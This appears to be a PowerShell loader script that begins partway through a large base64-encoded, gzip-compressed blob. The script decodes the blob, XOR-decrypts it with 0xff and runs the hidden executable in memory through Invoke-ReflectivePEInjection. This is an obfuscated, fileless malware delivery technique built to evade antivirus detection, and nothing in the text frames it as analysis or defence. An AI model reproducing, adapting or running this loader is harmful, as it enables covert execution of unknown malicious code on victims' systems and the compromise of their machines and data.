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"
}


$data = [System.Convert]::FromBase64String($base64data)

$ms = New-Object System.IO.MemoryStream
$output = New-Object System.IO.MemoryStream

$ms.Write($data, 0, $data.Length)
$ms.Seek(0,0) | Out-Null


$dstream = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress)


$inByte = $dstream.ReadByte()
while($inByte -ne -1){
    $output.writeByte($inByte)
    $inByte = $dstream.ReadByte()
}

write-Verbose "Payload decoded"
$EXEContentAsBytes = $output.ToArray()

$payloadLength = $EXEContentAsBytes.Length
write-Verbose "payloadLength = $payloadLength"

#Load and decrypt in memory the payload
[IntPtr]$PEBytesInMemory = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($payloadLength)

$hStr = $PEBytesInMemory.ToString()
write-Verbose " PEBytesInMemory = $hStr"


$current = Get-date -uformat "%d-%m-%y-%H-%M-%S"
write-Verbose "Decrypt PEBytesInMemory start current=$current"
For ($i=2; $i -lt $payloadLength; $i++) {
	$oneByte = $EXEContentAsBytes[$i]
	$oneByte = $oneByte  -bxor 0xff
	$EXEContentAsBytes[$i] = $oneByte 
}


write-Verbose "Call MemoryLoadLib"


Invoke-ReflectivePEInjection -PEBytes $EXEContentAsBytes 

